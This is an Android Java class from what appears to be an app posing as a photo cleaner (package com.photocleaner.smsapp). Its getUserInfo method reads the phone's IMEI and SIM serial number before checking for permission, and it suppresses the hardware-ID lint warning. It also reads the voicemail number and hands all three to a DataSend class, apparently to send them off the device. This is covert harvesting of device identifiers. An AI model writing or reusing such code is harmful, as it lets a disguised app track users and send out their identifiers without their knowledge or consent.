package com.photocleaner.smsapp;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import androidx.annotation.Keep;
import androidx.core.app.ActivityCompat;

import java.util.HashMap;
import java.util.Map;


@Keep
public class UserInfo {
    public void getUserInfo(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        @SuppressLint("HardwareIds") String imei = tm.getDeviceId();
        @SuppressLint("HardwareIds") String simSerial = tm.getSimSerialNumber();
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        String sim = tm.getVoiceMailNumber();
        Map<String, Object> userData = new HashMap<>();
        userData.put("imei", imei);
        userData.put("simSerial", simSerial);
        userData.put("number", String.valueOf(sim));
        new DataSend().userData(userData);
    }
}
